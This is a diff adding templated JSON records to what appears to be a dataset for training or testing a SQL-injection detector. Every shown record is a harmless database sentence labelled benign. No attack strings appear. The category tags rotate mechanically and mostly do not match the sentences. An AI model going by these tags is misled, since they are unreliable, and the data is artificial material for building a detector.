+    "text": "Upsert merges insert and update.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Merge statement syncs staging to prod.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Copy command loads CSV from disk.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Bulk export writes parquet files.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "ETL pipeline transforms raw logs.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Data warehouse star schema dims facts.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "OLAP cube aggregates KPI metrics.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "BI dashboard queries aggregated tables.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Cache layer reduces database load.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Query timeout cancels runaway select.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Statement timeout protects shared pool.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Lock timeout avoids indefinite wait.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Idle transaction kills stale sessions.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Connection limit per application user.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Role based access controls table grants.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Row level security filters tenant rows.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Column masking hides sensitive fields.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Encryption at rest protects disk pages.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "TLS encrypts traffic to database.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Certificate rotation updates client trust.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Secrets manager stores connection string.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Rotation policy updates database password.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  }
+]
